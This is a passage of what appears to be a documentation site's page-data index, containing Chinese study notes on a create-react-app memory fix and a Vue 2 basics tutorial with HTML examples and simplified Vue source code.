fs.existssync(paths.apptsconfig);，其中这个apptsconfig指向了项目根目录下的tsconfig.json。\n    * 仍然是那个文件，在里面搜索require.resolve(\'babel-loader\')，这个就是项目的编译器，会把/\\.(js|mjs|jsx|ts|tsx)$/这些文件编译成es5代码，编译时通过tsconfig.json再具体去做编译工作。',charsets:{cjk:!0}},{title:"react相关问题",frontmatter:{},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0React/react%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98.html",relativePath:"book-web/web前端js框架/学习React/react相关问题.md",key:"v-65d55112",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0React/react%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98.html",headers:[{level:2,title:"create-react-app问题",slug:"create-react-app问题",normalizedTitle:"create-react-app问题",charIndex:16}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"create-react-app问题",content:"# react相关问题\n\n\n# create-react-app问题\n\ncreate-react-app这个脚手架在3.3.0到4.0.0有内存占用过大和启动慢的问题解决办法：\n\n 1. 打开项目的node_modules/react-scripts/config/webpack.config.js\n 2. 在new ESLintPlugin({下面一行加上cache: true,，参考9886issue\n 3. 在将// TypeScript type checking与new ESLintPlugin({之间的代码注释掉，也就是禁止使用ForkTsCheckerWebpackPlugin，参考8096issue，该issue也有其他改法也可以试试",normalizedContent:"# react相关问题\n\n\n# create-react-app问题\n\ncreate-react-app这个脚手架在3.3.0到4.0.0有内存占用过大和启动慢的问题解决办法：\n\n 1. 打开项目的node_modules/react-scripts/config/webpack.config.js\n 2. 在new eslintplugin({下面一行加上cache: true,，参考9886issue\n 3. 在将// typescript type checking与new eslintplugin({之间的代码注释掉，也就是禁止使用forktscheckerwebpackplugin，参考8096issue，该issue也有其他改法也可以试试",charsets:{cjk:!0}},{title:"1.Vue基础",frontmatter:{title:"1.Vue基础"},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/1.vue%E5%9F%BA%E7%A1%80.html",relativePath:"book-web/web前端js框架/学习Vue/1.vue基础.md",key:"v-404438b8",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/1.vue%E5%9F%BA%E7%A1%80.html",headers:[{level:2,title:"一、Vue基本用法",slug:"一、vue基本用法",normalizedTitle:"一、vue基本用法",charIndex:12},{level:3,title:"1.1 初识Vue",slug:"_1-1-初识vue",normalizedTitle:"1.1 初识vue",charIndex:26},{level:3,title:"1.2 模板语法",slug:"_1-2-模板语法",normalizedTitle:"1.2 模板语法",charIndex:2627},{level:3,title:"1.3 单向和双向数据绑定",slug:"_1-3-单向和双向数据绑定",normalizedTitle:"1.3 单向和双向数据绑定",charIndex:5311},{level:2,title:"二、Vue的MVVM和数据代理",slug:"二、vue的mvvm和数据代理",normalizedTitle:"二、vue的mvvm和数据代理",charIndex:7776},{level:3,title:"2.1 Vue的MVVM",slug:"_2-1-vue的mvvm",normalizedTitle:"2.1 vue的mvvm",charIndex:7796},{level:3,title:"2.2 Vue的数据代理",slug:"_2-2-vue的数据代理",normalizedTitle:"2.2 vue的数据代理",charIndex:4900},{level:2,title:"三、在Vue中处理事件",slug:"三、在vue中处理事件",normalizedTitle:"三、在vue中处理事件",charIndex:12264},{level:3,title:"3.1 事件处理",slug:"_3-1-事件处理",normalizedTitle:"3.1 事件处理",charIndex:12280},{level:3,title:"3.2 事件修饰符",slug:"_3-2-事件修饰符",normalizedTitle:"3.2 事件修饰符",charIndex:16618},{level:3,title:"3.3 键盘事件",slug:"_3-3-键盘事件",normalizedTitle:"3.3 键盘事件",charIndex:21952},{level:2,title:"四、计算属性和监视属性",slug:"四、计算属性和监视属性",normalizedTitle:"四、计算属性和监视属性",charIndex:24775},{level:3,title:"4.1 计算属性",slug:"_4-1-计算属性",normalizedTitle:"4.1 计算属性",charIndex:24791},{level:3,title:"4.2 监视属性",slug:"_4-2-监视属性",normalizedTitle:"4.2 监视属性",charIndex:29602},{level:3,title:"4.3 监视属性对比计算属性",slug:"_4-3-监视属性对比计算属性",normalizedTitle:"4.3 监视属性对比计算属性",charIndex:34261},{level:2,title:"五、在Vue中使用样式",slug:"五、在vue中使用样式",normalizedTitle:"五、在vue中使用样式",charIndex:38179},{level:3,title:"5.1 绑定class样式",slug:"_5-1-绑定class样式",normalizedTitle:"5.1 绑定class样式",charIndex:38195},{level:3,title:"5.2 绑定style样式",slug:"_5-2-绑定style样式",normalizedTitle:"5.2 绑定style样式",charIndex:42522},{level:2,title:"六、条件渲染和列表渲染",slug:"六、条件渲染和列表渲染",normalizedTitle:"六、条件渲染和列表渲染",charIndex:45001},{level:3,title:"6.1 条件渲染",slug:"_6-1-条件渲染",normalizedTitle:"6.1 条件渲染",charIndex:45017},{level:3,title:"6.2 列表渲染",slug:"_6-2-列表渲染",normalizedTitle:"6.2 列表渲染",charIndex:48871},{level:3,title:"6.3 key作用和简单diff分析",slug:"_6-3-key作用和简单diff分析",normalizedTitle:"6.3 key作用和简单diff分析",charIndex:51707},{level:3,title:"6.4 列表的过滤和排序",slug:"_6-4-列表的过滤和排序",normalizedTitle:"6.4 列表的过滤和排序",charIndex:56979},{level:2,title:"七、Vue的数据监视",slug:"七、vue的数据监视",normalizedTitle:"七、vue的数据监视",charIndex:11679},{level:3,title:"7.1 更新时的一个问题",slug:"_7-1-更新时的一个问题",normalizedTitle:"7.1 更新时的一个问题",charIndex:61758},{level:3,title:"7.2 监视的数据是对象",slug:"_7-2-监视的数据是对象",normalizedTitle:"7.2 监视的数据是对象",charIndex:63360},{level:3,title:"7.3 Vue.set()",slug:"_7-3-vue-set",normalizedTitle:"7.3 vue.set()",charIndex:67505},{level:3,title:"7.4 监视的数据是数组",slug:"_7-4-监视的数据是数组",normalizedTitle:"7.4 监视的数据是数组",charIndex:65755},{level:2,title:"八、表单和过滤器",slug:"八、表单和过滤器",normalizedTitle:"八、表单和过滤器",charIndex:73301},{level:3,title:"8.1 收集表单数据",slug:"_8-1-收集表单数据",normalizedTitle:"8.1 收集表单数据",charIndex:73314},{level:3,title:"8.2 过滤器",slug:"_8-2-过滤器",normalizedTitle:"8.2 过滤器",charIndex:77102},{level:2,title:"九、内置指令和自定义指令",slug:"九、内置指令和自定义指令",normalizedTitle:"九、内置指令和自定义指令",charIndex:80447},{level:3,title:"9.1 内置指令",slug:"_9-1-内置指令",normalizedTitle:"9.1 内置指令",charIndex:80464},{level:3,title:"9.2 自定义指令",slug:"_9-2-自定义指令",normalizedTitle:"9.2 自定义指令",charIndex:84968}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、Vue基本用法 1.1 初识Vue 1.2 模板语法 1.3 单向和双向数据绑定 二、Vue的MVVM和数据代理 2.1 Vue的MVVM 2.2 Vue的数据代理 三、在Vue中处理事件 3.1 事件处理 3.2 事件修饰符 3.3 键盘事件 四、计算属性和监视属性 4.1 计算属性 4.2 监视属性 4.3 监视属性对比计算属性 五、在Vue中使用样式 5.1 绑定class样式 5.2 绑定style样式 六、条件渲染和列表渲染 6.1 条件渲染 6.2 列表渲染 6.3 key作用和简单diff分析 6.4 列表的过滤和排序 七、Vue的数据监视 7.1 更新时的一个问题 7.2 监视的数据是对象 7.3 Vue.set() 7.4 监视的数据是数组 八、表单和过滤器 8.1 收集表单数据 8.2 过滤器 九、内置指令和自定义指令 9.1 内置指令 9.2 自定义指令",content:'# Vue基础\n\n\n# 一、Vue基本用法\n\n\n# 1.1 初识Vue\n\n初学者不建议刚开始就用脚手架，我们先从普通html开始。在<head>里使用<script src="xxx">方式引入Vue库，并修改productionTip配置项，用于关闭浏览器DevTools里Vue的“请使用生产版本”提示信息。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    \x3c!-- 引入Vue --\x3e\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <script type="text/javascript">\n        // 阻止 vue 在启动时生成生产提示。\n        Vue.config.productionTip = false;\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n引入Vue库之后想要具体使用它，先准备一个div容器，并给它一个id属性（也可以class）；然后在<script>里new一个Vue实例，并传入配置对象。配置对象中的el，是用来关联之前准备好的div容器（将Vue实例挂载到根节点上），其值一般是#root这种css选择器字符串形式，也可以直接找到那个容器el: document.getElementById(\'root\')。配置对象中的data，是Vue实例的存储数据，可供关联容器使用，其值可以是对象（在组件里是函数，该函数再返回对象）。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    \x3c!-- 准备一个容器。使用id选择器，也可以是class选择器 --\x3e\n    <div id="root">\n        \x3c!-- {{}}是插值形式，属于模板语法。它可以使用Vue实例存储的数据 --\x3e\n        <h1>hello {{name}}</h1>\n    </div>\n    <script type="text/javascript">\n        // 阻止 vue 在启动时生成生产提示。\n        Vue.config.productionTip = false;\n        // 对Vue进行实例化\n        const vm = new Vue({\n            el: \'#root\',    // el用于指定当前Vue实例为哪个容器服务，值通常为CSS选择器字符串\n            data: {         // data用于存储数据，数据供el所指定容器去使用，值暂时为一个对象\n                name: \'张三\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n一个容器是否能关联多个Vue实例？一个Vue实例是否能关联多个容器？答案是都不可以，容器和Vue实例是一一对应的，不存在一对多或者多对一的关系。比如下面的写法是不规范的；如果写多个class形式的root容器，用一个Vue实例关联他们，结果是只有第一个root容器会正确渲染，代码就不演示了。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h1>hello {{name}}</h1>\x3c!-- name显示的是张三 --\x3e\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        new Vue({\n            el: \'#root\',\n            data: { name: \'张三\' }\n        });\n        // 不规范，也不会对那个root容器产生影响\n        new Vue({\n            el: \'#root\',\n            data: { name: \'李四\' }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；\n 2. root容器里的代码依然符合HTML规范，只不过混入了一些特殊的Vue语法（模板语法）；\n 3. Vue实例和容器是一一对应的；真实开发中只有一份Vue实例（和一个根节点），并且会配合着组件一起使用；\n\n----------------------------------------\n\n\n# 1.2 模板语法\n\n模板语法是一种基于HTML的语法，它可以在模板里使用Vue实例存储的数据。模板语法有插值和指令两类。\n\n其中插值是为了参与标签体内容的展示。插值使用两个花括号将一个js表达式括起来的，例如{{xxx}}，其中的xxx就是js表达式。\n\n * 那还得区分“js表达式”和“js语句”：\n   * js表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方，例如a（变量）、a+b、demo(1)、x === y ? \'a\' : \'b\'。\n   * js语句：基本语法组成的语句，还有完整的赋值、运算语句等，例如if(){}、for(){}、var a = 1。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- {{}}里使用js表达式，不能写if语句不能写for语句等 --\x3e\n        <h1>hello {{name}} - {{11+22}} - {{Date.now()}}</h1>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n指令是Vue提供的一些特殊attribute，每个指令的功能和作用点有些不一样（不止作用在标签内容体，要比插值作用范围广）。指令的前缀是v-，其值一般期望为js表达式（v-on、v-for会特殊些），当值改变时，会动态作用于相关的DOM。\n\n下面就是一个使用v-bind指令例子，用于给标签属性绑定值（其他指令并不一定作用于标签属性），v-bind也能作用于自定义属性。有些指令是可以进行简写的，v-bind:可以简写为:，还有v-on:可简写为@，像v-if和v-for就不可以简写。注意不要将{{}}写在标签属性里，会报错，插值是用在标签体的。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h1>插值语法</h1>\n        <h1>hello {{name}}</h1>\n        <h1>指令语法</h1>\n        \x3c!-- 指令的值是个表达式，url的值是\'www.baidu.com\'，最后href就是这个字符串 --\x3e\n        <a v-bind:href="url">{{name}}，请看这里</a><br>\n        \x3c!-- v-bind:可以简写为: --\x3e\n        <a :href="url">{{name}}，请看这里</a><br>\n        \x3c!-- 可以绑定其他属性，包括自定义属性 --\x3e\n        <a :x="msg">{{name}}，请看这里</a>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                url: \'www.baidu.com\',\n                msg: \'xxxxx\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n前面使用的{{name}}和:href="url"，一直没有解释为什么能直接使用name和url，这其中咋没出现vm和data呢？没有出现vm的原因是，模板语法可以直接访问vm的所有属性（无需vm.xxx）。没有出现data的原因有两个，这会在2.2 Vue的数据代理里解释。反正记住模板语法里可以直接写原配置对象里data的所有属性。\n\n----------------------------------------\n\n总结拓展：\n\n 1. 插值语法：\n    功能：用于解析标签体内容（标签闭合的内容）。\n    写法：{{xxx}}，xxx是js表达式。\n 2. 指令语法：\n    功能：用于解析标签（包扩：标签属性、标签体内容、绑定事件...）。\n    举例：v-bind:href="xxx"或简写为:href="xxx"，xxx是js表达式。\n    备注：这里是拿v-bind作为例子，Vue还是其他常用的指令，可作用于标签体内容等，但值也不一定就是js表达式。\n 3. 模板语法里不要出现vm和data的字样，可直接写原配置对象里data的所有属性。\n\n----------------------------------------\n\n\n# 1.3 单向和双向数据绑定\n\n前面我们使用过v-bind对标签属性进行了数据绑定，可以直接读取到data中的所有属性（{{}}也可以），并且一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新。我们用以下代码并配合使用Vue Devtools对data数据进行修改，页面里使用到对应data数据的地方都会重新渲染。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- v-bind是单向的，{{}}也是单向的，数据控制着页面展示 --\x3e\n        单向数据绑定1：<a v-bind:href="url">hello, {{name}}</a><br>\n        单向数据绑定2：<input type="text" v-bind:value="text">\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        new Vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                url: \'www.baidu.com\',\n                text: \'你好呀！\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n\n你会发现从“数据”到“页面”这是一种单方向的控制，反过来就不行了。在上面例子输入框里输入新的值，你会发现虽然输入框内容展示变了，但Vue Devtools的data里的text不会跟着变，可以看下面的效果图。我们将使用v-bind以达到“存储数据”单向控制“页面展示”的方式称为单向数据绑定（{{}}也是单向的）。\n\n\n\n要想让输入框内容的改变影响到data里的text（也就是“页面”也能控制“存储数据”），是可以使用v-model的双向数据绑定，代码如下。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        单向数据绑定：<input type="text" v-bind:value="textOne"><br>\n        双向数据绑定：<input type="text" v-model:value="textTwo">\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        new Vue({\n            el: \'#root\',\n            data: {\n                textOne: \'你好呀！\',\n                textTwo: \'我不好！\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n\nv-model一般用在输入类或者说表单类元素里，因为表单类元素有“用户操作”的点。其他普通元素没有“用户操作”的地方，而且也不需要让普通元素来影响到data数据。\n\n一般来说，v-model绑定的是表单类元素的value属性，这样的情况是可以简写的，例如v-model:value简写为v-model="xxx"。如果绑定的属性不是value属性，就不要进行简写了。还有就是，如果你强行使用v-model到非表单类元素里，Vue会在控制台里发出错误提示。\n\n\x3c!-- v-model是作用在表单元素的value上，所以连带value字段也隐藏了 --\x3e\n<input type="text" v-model:value="text">\n<input type="text" v-model="text">\n\n\n1\n2\n3\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 单向数据绑定(v-bind)：数据只能从data流向页面。\n 2. 双向数据绑定(v-model)：数据不仅能从data流向页面，也能从页面流向data。\n 3. 双向数据绑定一般应用在表单类元素上（如：<input>、<select>等）。\n 4. v-model:value可以简写为v-model，因为v-model一般默认收集的就是value值。\n\n----------------------------------------\n\n\n# 二、Vue的MVVM和数据代理\n\n\n# 2.1 Vue的MVVM\n\n> 虽然没有完全遵循 MVVM 模型，但是 Vue 的设计也受到了它的启发。——Vue官网\n\n 1. M：模型（Model），对应data中的数据，开发人员编写的js对象等原始数据。\n 2. V：视图（View），模板，其实最后都是页面上DOM。\n 3. VM：视图模型（ViewModel），Vue实例对象，它提供了很多功能，比如数据绑定和DOM监听。\n\n\n\n最难理解的就是VM，它代表就是Vue框架，给开发人员提供很多有用的属性和方法。把Vue框架引入我们自己的项目并将其实例化（具体化），那得到就是常命名为vm的Vue实例了，如下图。\n\n\n\n在1.2 模板语法里说过“模板语法可以直接访问vm的所有属性”（这是Vue规定的），所有属性包括内部属性以及原型上的属性，这是Vue框架给开发人员提供使用的一部分能力，另一部分是可以在js代码里使用Vue自带的方法（框架提供的方法，例如$mount是另一种挂载方式）。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 这个是data数据 --\x3e\n        <h1>hello {{name}}</h1>\n        \x3c!-- 这个是内部属性 --\x3e\n        <h1>_c：{{_c}}</h1>\n        \x3c!-- 这个是原型上的 --\x3e\n        <h1>$destroy：{{$destroy}}</h1>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: { name: \'张三\' }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n\n上图的vm里除了有自身的属性，也出现了data里的所有属性，这会在接下来的2.2 Vue的数据代理里进行解释。\n\n----------------------------------------\n\n总结拓展：\n\n 1. M模型（Modle），data中的数据；V视图（View），模板代码；VM视图模型（ViewModel），Vue实例。\n 2. vm身上的所有属性及Vue原型上的所有属性，在Vue模板中都可以直接使用。\n 3. data中所有的属性，最后都出现在了vm身上。\n\n----------------------------------------\n\n\n# 2.2 Vue的数据代理\n\n数据代理是指通过一个对象代理对另一个对象中属性的操作（读/写），在使用的时候我们只接触到了表面的那个对象，而另外一个对象会隐藏在暗处。\n\n要搞清楚数据代理，首先得了解数据属性、访问器属性、Object.defineProperty()方法。\n\n数据属性有四个特性，[[Configurable]]可配置的，[[Enumerable]]可枚举的，[[Writable]]可重写的，[[Value]]属性值。访问器属性也有四个特性，[[Configurable]]可配置的、[[Enumerable]]可枚举的、[[Get]]和[[Set]]（我们常说的getter和setter）。\n\n使用属性的基本特性并搭配Object.defineProperty()可以实现简单的数据代理。\n\n// 通obj2去代理obj1的x属性\nlet obj1 = { x: 200 };\nlet obj2 = { x: 300 };\nObject.defineProperty(obj2, \'x\', {\n    get() {\n        return obj1.x;\n    },\n    set(value) {\n        obj1.x = value;\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n我们先不着急说Vue中的数据代理，我们先想一下配置对象的data存到哪里去了。在实例化Vue时，Vue()构造函数会处理配置对象，将其中的data数据存到Vue实例的_data（也就是vm._data）。可以看下面简化的Vue源码（在源码里搜function Vue），具体到下面代码的到initData(vm)里会有对上面“将其中的data数据存到Vue实例的_data”的印证。\n\n// 无关紧要的都删掉不看了\nfunction Vue(options) {\n    // vm会是以后的Vue实例，options就是配置对象\n    var vm = this;\n    // 将options合并后到vm.$options，暂不用管mergeOptions和xxx是什么\n    vm.$options = mergeOptions(xxx, options || {}, vm);\n    // 数据处理相关\n    initState(vm);\n}\nfunction initState(vm) {\n    initData(vm);\n}\n// 重点来了，将配置对象的data存储数据都给了vm._data\nfunction initData(vm) {\n    var data = vm.$options.data;\n    data = vm._data = typeof data === \'function\' ? getData(data, vm) : data || {};\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n我们知道了数据最终会存到vm._data里，那为什么插值和指令在访问数据时反而没有用到_data呢？原因是Vue做了数据代理，让vm代理vm._data里的所有属性，达到了上一小节末尾所说的“data中所有的属性最后都出现在了vm身上”。减少了一层_data的访问，方便了开发人员在模板中更简便地使用存储数据。\n\n我们可以接着上面的简化源代码，继续看是怎样让vm代理vm._data的。\n\n// 无关紧要的都删掉不看了\nfunction initData(vm) {\n    var data = vm.$options.data;\n    // 将配置对象的data存储数据都给了vm._data\n    data = vm._data = typeof data === \'function\' ? getData(data, vm) : data || {};\n    // 遍历对象所有的属性key\n    var keys = Object.keys(data);\n    var i = keys.length;\n    // 代理所有的属性\n    while (i--) {\n        var key = keys[i];\n        proxy(vm, "_data", key);\n    }\n}\n// 访问器属性的四个特性\nvar sharedPropertyDefinition = {\n    enumerable: true,\n    configurable: true,\n    get: function(a, b, c) { },\n    set: function(a, b, c) { }\n};\n/**\n * 重点来了，使用Object.defineProperty将vm._data的所有属性都加到vm上了\n * 读取的时候，实际读的是vm._data.xxx\n * 修改的时候，实际改的是vm._data.xxx\n*/\nfunction proxy(target, sourceKey, key) {\n    // getter\n    sharedPropertyDefinition.get = function proxyGetter() {\n        return this[sourceKey][key]\n    };\n    // setter\n    sharedPropertyDefinition.set = function proxySetter(val) {\n        this[sourceKey][key] = val;\n    };\n    // 添加key，并设置特性\n    Object.defineProperty(target, key, sharedPropertyDefinition);\n}\n// 这只是讲了数据代理，至于数据劫持，在[七、Vue的数据监视](#七vue的数据监视)里会将\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n1.2 模板语法的末尾“没有出现data”的两个原因，就是这一小节讲的：1) data会存到vm._data；2) 模板语法里要去掉_data这一层访问。\n\n----------------------------------------\n\n总结拓展：\n\n 1. Vue实例化时，配置对象中的data最终会存储到vm._data里。\n 2. Vue中的数据代理：通过vm来代理vm._data中属性的操作（读/写）。\n 3. Vue中数据代理的好处：在模板中更加方便的读写_data中的数据。\n 4. 基本原理：\n    1. 通过Object.defineProperty()把vm._data中所有的属性添加到vm上；\n    2. 为每一个添加到vm上的属性，都指定一个getter/setter；\n    3. 在getter/setter内部去操作（读/写）vm._data中对应的属性。\n\n----------------------------------------\n\n\n# 三、在Vue中处理事件\n\n\n# 3.1 事件处理\n\n要给元素绑定事件，需要用到Vue的v-on指令。其值通常是事件回调函数，值还可以是一些简单语句（例如改变状态xxx = !xxx）。那这个回调函数定义在哪呢？当然还是Vue的配置对象里，具体在methods里（methods、el和data平级）。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- v-on用于绑定事件 --\x3e\n        <button v-on:click="showInfo">点击我提示信息</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showInfo() {\n                    alert(\'提示！！！\');\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n要注意的几点：\n\n 1. v-on:是可以简写为@的（例如v-on:click简写为@click）；\n 2. methods里的方法最好不要写成箭头函数（写成普通函数），因为箭头函数没有自己的this，那实际this的指向可能不是我们需要的。\n 3. 回调函数有个默认参数是event，是常用的事件对象。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- v-on可以简写为@ --\x3e\n        <button @click="showInfo">点击我提示信息</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                // showInfo最好写成普通函数，this指向vm\n                showInfo(e) {\n                    // e是点击事件对象\n                    console.log(\'e\', e);\n                    alert(\'提示！！！\');\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n实际开发中，事件回调函数是需要接受类似index的参数，那么写成@click="showInfo(66)"吗？这样是不行的，这样会丢失event事件对象，Vue为我们处理了这个问题，它使用$event给事件对象占位，这样就不会丢失了。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- $event为事件对象；也可以showInfo($event, 66) --\x3e\n        <button @click="showInfo(66, $event)">点击我提示信息</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showInfo(index, e) {\n                    console.log(\'e\', e);\n                    alert(\'提示！！！\' + index);\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n你可能会想到把methods里的方法移到data里，可以但没必要。因为data里的是存储数据，存储数据的变动会影响到页面的渲染，而methods里的方法大多是事件的回调函数（不是什么要紧数据），函数对象的变化基本不会对页面渲染产生影响，所以移到data是没有必要的。\n\n可以看到前面例子里@click="showInfo"，都是直接调用showInfo，并没有经过一层methods或_methods。是的，Vue()构造函数里处理了这件事，先是使用bind()生成了新方法（并改了this为vm），最后把这些新方法放到了vm上。这样少了一层methods或_methods访问，方便开发人书写。Vue()构造函数中与methods相关的简化源代码如下。\n\n// 无关紧要的都删掉不看了\nfunction Vue(options) {\n    // vm会是以后的Vue实例，options就是配置对象\n    var vm = this;\n    // 将options合并后到vm.$options，暂不用管mergeOptions和xxx是什么\n    vm.$options = mergeOptions(xxx, options || {}, vm);\n    // 数据处理相关\n    initState(vm);\n}\nfunction initState(vm) {\n    // 这是这一节的重点\n    initMethods(vm, vm.$options.methods);\n    // 这是 2.2 Vue的数据代理 那节的重点，这里忽略\n    initData(vm);\n}\n/**\n * 重点来了，使用bind生成了同methods[key]一样的方法，并将vm作为新方法的this\n * 最后就是将新方法放到了vm里同属性key里\n*/\nfunction initMethods(vm, methods) {\n    for (var key in methods) {\n        // noop就别管了，使用bind是重点，为啥不直接给vm，而是新生成一个函数，可能是考虑到闭包问题\n        vm[key] = typeof methods[key] !== \'function\' ? noop : bind(methods[key], vm);\n    